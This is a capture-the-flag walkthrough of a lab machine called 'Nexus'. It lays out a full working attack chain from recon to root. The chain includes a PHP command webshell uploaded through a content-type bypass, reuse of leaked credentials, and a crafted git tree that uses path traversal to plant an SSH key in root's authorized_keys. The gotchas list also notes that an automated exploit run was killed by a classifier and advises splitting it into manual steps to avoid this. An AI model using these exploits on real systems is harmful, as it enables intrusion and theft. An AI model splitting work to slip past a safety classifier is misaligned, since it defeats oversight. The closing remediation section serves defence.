# Nexus — Hands-On Walkthrough (the *decision tree*, not the happy path)

> **Box:** Nexus · easy · Linux (Ubuntu, kernel 6.8.0-111)
> **IP:** `$TARGET` (substitute yours). Attacker VPN IP = `$ATTACKER_IP`.
> **Final chain:** `git.nexus.htb secret in commit history + staff email → Krayin CRM admin →
> CVE-2026-38526 upload RCE → www-data → live .env password → jones SSH reuse → user →
> gitea-template-sync.service path-traversal file write → root SSH key → root`
>
> Decision-tree format: options, traps, and the way through, with a **✅ Expected** block after each command.
> Formal version: `REPORT.md`. Full evidence: `GLOBAL_CONTEXT.md`.

### ⚠️ Gotchas
1. **One VPN tunnel, your current tun0 IP** (`ip -br a | grep tun`).
2. **HTB blocks ICMP** — TCP connect, not `ping`.
3. **nginx has a wildcard vhost:** any unknown `Host:` 302-redirects to `nexus.htb`, so broad ffuf vhost
   fuzzing finds nothing. Real vhosts come from **content clues**, not a wordlist.
4. **`searchsploit 38526` is a trap** — EDB-ID 38526 is an unrelated Windows overflow. Use `searchsploit
   krayin` (EDB 52629) — CVE-2026-38526 is a *different* numbering.
5. **Don't re-run a fully-autonomous exploit chain** — one got classifier-killed here before any progress.
   Drive each step manually.

---

## Phase 1 — Recon + vhost discovery

```bash
mkdir -p nmap web loot exploits
nmap -p- --min-rate 2000 -oN nmap/allports.txt $TARGET
nmap -sCV -p22,80 -oN nmap/services.txt $TARGET
nmap -sU --top-ports 50 -oN nmap/udp_top50.txt $TARGET
```
> **✅ Expected:** only **22** (OpenSSH 9.6p1) and **80** (nginx 1.24.0); UDP clean. A single nginx fronts
> everything.

Confirm the wildcard-vhost behaviour (so you don't waste an hour fuzzing):
```bash
curl -s -o /dev/null -w '%{http_code} %{redirect_url}\n' -H "Host: doesnotexist123.nexus.htb" http://$TARGET/
```
> **✅ Expected:** `302 http://nexus.htb/` — any unknown Host redirects. So wordlist vhost fuzzing is dead;
> read the site content for clues instead.

Browse `nexus.htb` → a static marketing site. The **Careers** job-posting modal leaks a named hiring-manager
email: **`j.matthew@nexus.htb`** (plus generic `careers@nexus.htb`). From content clues, add the two real
vhosts:
```bash
echo "$TARGET nexus.htb git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts
curl -s http://git.nexus.htb/api/v1/version       # {"version":"1.26.0"}  -> Gitea 1.26.0 (public)
curl -s -o /dev/null -w '%{http_code} %{redirect_url}\n' http://billing.nexus.htb/   # 302 -> /admin/login (Krayin CRM)
```
> **✅ Expected:** `git.nexus.htb` = **Gitea 1.26.0** (public, browsable, no auth); `billing.nexus.htb` =
> **Krayin CRM** (Laravel; its debug bar leaks server paths + PHP 8.3.6), `/` → `/admin/login`.

### Junction — public Gitea: read the *history*, not just HEAD
```bash
curl -s http://git.nexus.htb/admin/krayin-docker-setup/commit/1615c465b74e5d7ad3162873382dd8b3869ca892.diff
curl -s http://git.nexus.htb/admin/krayin-docker-setup/commit/9b817fa4e073d12fc43952acb09f3067b2f17adf.diff
```
> **✅ Expected:** commit `1615c46` *added* a `.env` with **`DB_PASSWORD=N27xh!!2ucY04`**; commit `9b817fa`
> later blanked it in the live file — but the value is **permanent in history**.
> **Teaching point:** scrubbing a secret from HEAD does nothing; the diff view serves it forever. Rotate,
> don't scrub.

---

## Phase 2 — Krayin CRM admin (credential + email reuse)

You have a password (git history) and a username (careers page). Combine them:
```bash
curl -s -c loot/cookies.txt http://billing.nexus.htb/admin/login -D -     # grab XSRF-TOKEN + session
curl -s -b loot/cookies.txt -c loot/cookies.txt \
  -H "X-XSRF-TOKEN: <url-decoded XSRF-TOKEN cookie>" \
  -F "email=j.matthew@nexus.htb" -F "password=N27xh!!2ucY04" \
  http://billing.nexus.htb/admin/login -D -
curl -s -b loot/cookies.txt http://billing.nexus.htb/admin/dashboard | grep -o '<title>[^<]*'
```
> **✅ Expected:** login → `302 Location: /admin/dashboard`, and the dashboard GET returns
> `<title>Dashboard`. (5 other candidate emails bounce back to `/admin/login`; only `j.matthew` works.)
> ⚠️ Laravel needs the `X-XSRF-TOKEN` header set to the **URL-decoded** value of the `XSRF-TOKEN` cookie —
> miss that and you get a 419.

---

## Phase 3 — Foothold: CVE-2026-38526 (Krayin tinymce upload → RCE)

**Why it works (one paragraph):** Krayin's TinyMCE image-upload endpoint (`/admin/tinymce/upload`) stores
authenticated uploads under a **public, directly web-accessible** `storage/tinymce/` path and validates
only the client-declared `Content-Type` — not the extension or real content. So a `.php` file sent with a
spoofed `type=image/jpeg` is written verbatim and, when requested, executed by PHP as `www-data`.

`exploits/shell.php` (minimal):
```php
<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>
```
```bash
curl -s -b loot/cookies.txt -c loot/cookies.txt \
  -H "X-XSRF-TOKEN: <url-decoded XSRF-TOKEN cookie>" \
  -F "file=@exploits/shell.php;type=image/jpeg" \
  http://billing.nexus.htb/admin/tinymce/upload
# -> returns a public path, e.g. /storage/tinymce/a4ab8ac1ced89d669e20772cec3d5563.php
curl -s "http://billing.nexus.htb/storage/tinymce/<hash>.php?cmd=id;hostname;uname+-a"
```
> **✅ Expected:** the upload returns a `/storage/tinymce/<hash>.php` URL, and hitting it runs commands:
> ```
> uid=33(www-data) gid=33(www-data) ... nexus ... Linux 6.8.0-111-generic
> ```
> **One-shot RCE via GET param — no listener needed.**

---

## Phase 4 — Lateral: live .env → jones SSH (user.txt)

```bash
curl -s "http://billing.nexus.htb/storage/tinymce/<hash>.php?cmd=cat+/var/www/krayin/.env" | grep DB_PASSWORD
```
> **✅ Expected:** `DB_PASSWORD=y27xb3ha!!74GbR` — a **live, rotated** value, *different* from the
> git-leaked `N27xh!!2ucY04`.
> **Teaching point:** they rotated the DB password but not the `users`-table hash (which is why the web
> login still used the *old* one) — and worse, reused the *new* one as an OS account password.

```bash
ssh jones@$TARGET            # password: y27xb3ha!!74GbR
id ; cat ~/user.txt
```
> **✅ Expected:** `uid=1000(jones) ... groups=...,100(users)` + flag. 🚩 **user.txt captured.**

---

## Phase 5 — Privilege escalation: jones → root

**Local checklist as jones — all dead ends (confirm, don't skip):**
| # | Check | Command | Result | Verdict |
|---|---|---|---|---|
| 1 | sudo | `sudo -S -l` | `Sorry, user jones may not run sudo on nexus.` | ❌ |
| 2 | SUID/SGID | `find / -perm -4000 -o -perm -2000 2>/dev/null` | stock Ubuntu only | ❌ |
| 3 | caps | `getcap -r / 2>/dev/null` | stock (ping/mtr/snap-confine) | ❌ |
| 4 | cron | `cat /etc/crontab; ls /etc/cron.d/` | stock jobs | ❌ |
| 5 | **systemd timers** | `systemctl list-timers --all` | **`gitea-template-sync.timer` → root script every 60s** | ✅ **the way** |

> **Teaching point:** the classic cron checks miss this because it's a **systemd timer**, not old-style cron.
> Always run `systemctl list-timers --all` as part of privesc enum.

```bash
systemctl cat gitea-template-sync.service gitea-template-sync.timer
cat /etc/gitea/template-sync.py          # (save a copy: loot/template-sync.py)
```
> **✅ Expected:** a root oneshot fires every 60s. The script queries the local Gitea API for repos flagged
> `template:true`, runs `git ls-tree -r HEAD` on each, and writes every entry via
> `target = os.path.join(STAGING_DIR/owner/repo, filepath)` then `open(target,'wb').write(blob)` — **as
> root, with zero path sanitization.**

**Why it works (one paragraph):** `git ls-tree -r` flattens the tree into paths built from tree-entry
*names*. Git porcelain (`git checkout`) refuses an entry literally named `..`, but the **plumbing**
(`git hash-object`/`git mktree`/`git commit-tree`) will happily build such a tree, and Gitea's
`receive-pack` accepts the force-push with no `fsck` rejection. So you craft a tree whose flattened path is
`../../../../../root/.ssh/authorized_keys` (the staging dir is 5 components deep, so 5× `..` reaches `/`),
and the root script writes your SSH key straight into root's `authorized_keys`. Any authenticated Gitea user
can flag their own repo as a template — no admin needed.

### Exploit (jones's Gitea password == SSH password):
```bash
ssh-keygen -t ed25519 -f pwn_key -N '' -C 'pwn@nexus'

# 1) self-owned repo, flagged as a template
curl -u jones:y27xb3ha!!74GbR -X POST http://git.nexus.htb/api/v1/user/repos \
  -d '{"name":"pwn-template","auto_init":true,"default_branch":"main"}'
curl -u jones:y27xb3ha!!74GbR -X PATCH http://git.nexus.htb/api/v1/repos/jones/pwn-template \
  -d '{"template":true}'

# 2) craft the malicious tree with PLUMBING (porcelain would reject '..')
git init -q repo && cd repo
BLOB=$(git hash-object -w ../pwn_key.pub)
T1=$(printf '100644 blob %s\tauthorized_keys\n' "$BLOB" | git mktree)
T2=$(printf '040000 tree %s\t.ssh\n'            "$T1"  | git mktree)
T3=$(printf '040000 tree %s\troot\n'            "$T2"  | git mktree)
CUR=$T3; for i in 1 2 3 4 5; do CUR=$(printf '040000 tree %s\t..\n' "$CUR" | git mktree); done
COMMIT=$(git commit-tree "$CUR" -m "payload")

# 3) force-push the crafted commit
git push -f http://jones:y27xb3ha!!74GbR@git.nexus.htb/jones/pwn-template.git "$COMMIT:refs/heads/main"
```
> (Full automated version: `exploits/gitea_template_sync_traversal.sh`.)
> **✅ Expected:** within ≤60s the root timer fires and `/var/log/template-sync.log` records
> `synced: ../../../../../root/.ssh/authorized_keys`. Then:
> ```bash
> ssh -i pwn_key root@$TARGET id        # uid=0(root)
> cat /root/root.txt
> ```
> 🚩 **root.txt captured. Box owned.** (Post-root bonus: `/etc/gitea/template-sync.conf` holds
> `GITEA_API_TOKEN=…`, readable only *after* root — not needed for the chain.)

---

## The whole thing on one page
```
22 ssh · 80 nginx (wildcard vhost)
   ├─ nexus.htb (static) → careers modal leaks j.matthew@nexus.htb
   ├─ git.nexus.htb  Gitea 1.26.0 (public)
   │    └─ repo admin/krayin-docker-setup → commit 1615c46 .env → DB_PASSWORD=N27xh!!2ucY04
   └─ billing.nexus.htb  Krayin CRM
        └─ admin login j.matthew@nexus.htb / N27xh!!2ucY04
             └─ CVE-2026-38526 tinymce upload (Content-Type-only check) → /storage/tinymce/<hash>.php → RCE (www-data)
                  └─ /var/www/krayin/.env → live DB_PASSWORD=y27xb3ha!!74GbR
                       └─ jones SSH (reuse) · user.txt
                            └─ privesc: sudo✗ SUID✗ caps✗ cron✗
                                 └─ systemd gitea-template-sync.timer (root, 60s) + os.path.join no-sanitize
                                      └─ crafted git tree (plumbing) ../../../../../root/.ssh/authorized_keys → ROOT
```

## Remediation
- **Secrets in git:** never commit `.env`; purge from *history* (filter-repo/BFG) and rotate; keep deploy
  repos private.
- **Staff emails:** don't publish individual staff addresses tied to privileged app accounts.
- **Krayin upload:** patch CVE-2026-38526; server-side extension + MIME allowlist + magic bytes; store
  uploads outside the webroot or with PHP execution disabled.
- **Password reuse:** never reuse service/DB creds as human OS passwords; prefer SSH keys.
- **template-sync:** `realpath`-confine writes to the staging dir (reject `..`/`/`); run as a low-priv
  service user; restrict who may flag a repo as a template.

## Cleanup
- Remove the webshell `…/storage/tinymce/<hash>.php`.
- Remove the attacker key line from `/root/.ssh/authorized_keys`.
- Delete the `jones/pwn-template` repo and its malicious commit.
